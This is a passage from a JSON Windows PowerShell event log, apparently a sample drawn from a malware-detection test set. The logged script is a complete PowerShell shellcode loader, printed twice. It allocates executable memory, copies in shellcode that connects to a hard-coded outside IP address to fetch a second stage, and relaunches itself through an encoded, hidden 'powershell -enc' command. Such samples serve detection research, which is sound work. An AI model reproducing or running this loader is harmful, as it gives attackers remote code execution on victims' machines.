,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}\r\n\r\nScriptBlock ID: f5a1f786-b529-4da3-ae6d-47d0eaac0ac2\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3243.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$1 = '$c = ''[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x05,0xdb,0xca,0xa6,0x68,0x02,0x00,0x11,0x5d,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \\\"\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell\\\";$cmd = \\\"-nop -noni -enc \\\";iex \\\"&amp; $x86 $cmd $gq\\\"}else{$cmd = \\\"-nop -noni -enc\\\";iex \\\"&amp; powershell $cmd $gq\\\";}","scriptBlockId":"f5a1f786-b529-4da3-ae6d-47d0eaac0ac2","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3243.ps1"}}},"location":"EventChannel"}
